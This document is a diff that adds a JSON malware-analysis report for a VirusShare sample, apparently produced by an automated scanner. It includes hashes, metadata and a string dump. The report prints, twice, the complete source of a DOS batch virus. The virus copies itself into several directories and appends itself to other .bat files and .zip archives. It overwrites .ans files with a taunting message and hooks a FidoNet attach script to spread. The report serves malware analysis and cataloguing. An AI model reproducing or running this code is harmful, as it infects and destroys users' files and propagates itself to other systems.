@@ -1,0 +1,87 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "@echo off\nif exist c:\\ok.txt goto okok\n@ctty nul\ntype ok >> c:\\ok.txt\ncopy %0 c:\\\nc:\\%0\ncopy %0 c:\\fido\nc:\\fido\\%0\ncopy %0 c:\\util\nc:\\util\\%0\ncopy %0 d:\\util\nd:\\util\\%0\ncopy %0 %winbootdir%\n%winbootdir%\\%0\ncopy %0 d:\\tools\nd:\\tools\\%0\ncopy %0 c:\\tools\nc:\\tools\\%0\necho. >> c:\\fido\\attach.bat\necho attach.exe -A -L %0 >> c:\\fido\\attach.bat\nattrib c:\\ok.txt +h +r\n:okok\nif exist c:\\butcher.txt goto cont\necho \u001b[0;1;33m\u001b[2J\u001b[6C\u001b[32mHello sentence! >> c:\\butcher.txt\necho  \u001b[36m\u0002\u0002\u0002 butcher go for you! \u0002\u0002\u0002 >> c:\\butcher.txt\necho \u001b[7C\u001b[31mHa-Ha-Ha!\u001b[0m >> c:\\butcher.txt\n:cont\nfor %%i in (*.bat ..\\*.bat) do set TRTL = %%i\nfor %%f in (*.bat ..\\*.bat) do find \"TRTL\" %%f\nfor %%j in (*.bat ..\\*.bat) do if %%j==ATTACH.BAT goto att\ngoto re\n:att\necho. >> attach.bat\necho attach.exe -A -L %0 >> attach.bat\nexit\n:re\nif not errorlevel 1 goto next\nfor %%d in (*.bat) do copy /b %%d + %0\n:next\nfor %%z in (*.zip) do pkzip %%z %0\nfor %%q in (*.ans c:\\max\\*.ans) do copy c:\\butcher.txt %%q\n@ctty con\n: (c) Unknow! December 1999..."
+    },
+    "filename": "VirusShare_6a30d27d9fefe6b9db0f24d8df037d5f",
+    "filesize": 1056,
+    "filetype": "data",
+    "hashes": {
+        "md5": "6a30d27d9fefe6b9db0f24d8df037d5f",
+        "sha1": "5cc1f945f11d1ad6a6539f2d5e75b3745ce74ffe",
+        "sha256": "7a2f829380189ada25f93f31f071ca78d73a02ae388d71fbd8dc4342f572023a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if exist c:\\ok.txt goto okok",
+            "@ctty nul",
+            "type ok >> c:\\ok.txt",
+            "copy %0 c:\\",
+            "c:\\%0",
+            "copy %0 c:\\fido",
+            "c:\\fido\\%0",
+            "copy %0 c:\\util",
+            "c:\\util\\%0",
+            "copy %0 d:\\util",
+            "d:\\util\\%0",
+            "copy %0 %winbootdir%",
+            "%winbootdir%\\%0",
+            "copy %0 d:\\tools",
+            "d:\\tools\\%0",
+            "copy %0 c:\\tools",
+            "c:\\tools\\%0",
+            "echo. >> c:\\fido\\attach.bat",
+            "echo attach.exe -A -L %0 >> c:\\fido\\attach.bat",
+            "attrib c:\\ok.txt +h +r",
+            ":okok",
+            "if exist c:\\butcher.txt goto cont",
+            "echo ",
+            "[0;1;33m",
+            "[32mHello sentence! >> c:\\butcher.txt",
+            "echo  ",
+            "[36m",
+            " butcher go for you! ",
+            " >> c:\\butcher.txt",
+            "echo ",
+            "[31mHa-Ha-Ha!",
+            "[0m >> c:\\butcher.txt",
+            ":cont",
+            "for %%i in (*.bat ..\\*.bat) do set TRTL = %%i",
+            "for %%f in (*.bat ..\\*.bat) do find \"TRTL\" %%f",
+            "for %%j in (*.bat ..\\*.bat) do if %%j==ATTACH.BAT goto att",
+            "goto re",
+            ":att",
+            "echo. >> attach.bat",
+            "echo attach.exe -A -L %0 >> attach.bat",
+            "exit",
+            "if not errorlevel 1 goto next",
+            "for %%d in (*.bat) do copy /b %%d + %0",
+            ":next",
+            "for %%z in (*.zip) do pkzip %%z %0",
+            "for %%q in (*.ans c:\\max\\*.ans) do copy c:\\butcher.txt %%q",
+            "@ctty con",
+            ": (c) Unknow! December 1999..."
+        ],
+        "file": {
+            " >> c:\\butcher.txt": "Text",
+            "[0m >> c:\\butcher.txt": "Text",
+            "[32mHello sentence! >> c:\\butcher.txt": "Text",
+            "type ok >> c:\\ok.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266615",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
